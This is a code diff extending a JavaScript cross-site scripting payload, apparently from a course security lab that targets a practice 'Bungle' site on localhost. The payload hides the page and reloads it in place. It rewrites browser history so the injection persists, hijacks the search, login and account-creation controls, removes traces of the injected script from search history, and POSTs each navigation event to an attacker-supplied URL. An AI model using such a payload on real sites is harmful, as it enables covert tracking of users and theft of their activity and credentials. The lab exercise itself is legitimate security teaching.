@@ -4,29 +4,43 @@
 
 // Extend this function:
 function payload(attacker) {
-    //document.getElementById("bungle-lnk").href = "./".concat(url.substring("http://127.0.0.1/project2/".length));
+    window.onpopstate = function(event) {
+        console.log(event.state["href"]);
+        proxy(event.state["href"]);
+    }
     function log(data) {
         console.log($.param(data))
         $.post(attacker, data);
     }
     function proxy(href) {
+        window.history.pushState({"href": href}, "page 1", href);
+
         $("html").load(href, function(){
-            window.history.pushState({page: 1}, "page 1", href);
             $("html").show();
             log({event: "nav", uri: href});
-            //console.log("./search?q=" + $("form[action='#./search']").val());
             $("#bungle-lnk").attr("href", "./" + url);
             if(href == "./") {
                 $("#search-btn").attr("type", "button");
                 $("#search-btn").click(function() {
                     proxy("./search?q=" + $("#query").val());
                 });
+                $("#log-in-btn").attr("formaction", url+"/login");
+                //$("form[action='#./login']").attr("action", url+"/login");
+                $("#new-account-btn").attr("type", "button");
+                $("#new-account-btn").click(function() {
+                    $.post("./create?username=" + $("#username").val() + "&password=" + $("#userpass").val());
+                });
             }
-            else {
-                $("a:contains('<script>')").remove();
+            else if(href.includes("search")){
                 $("#search-again-btn").attr("href", "./" + url);
+                $("a:contains('<script>')").remove();
+                $("a.history-item").each(function() {
+                    $(this).attr("href", "javascript:void");
+                    $(this).click(function() {
+                        proxy("./search?q=" + $(this).text());
+                    });
+                });
             }
-            
         });
     }
     $("html").hide();
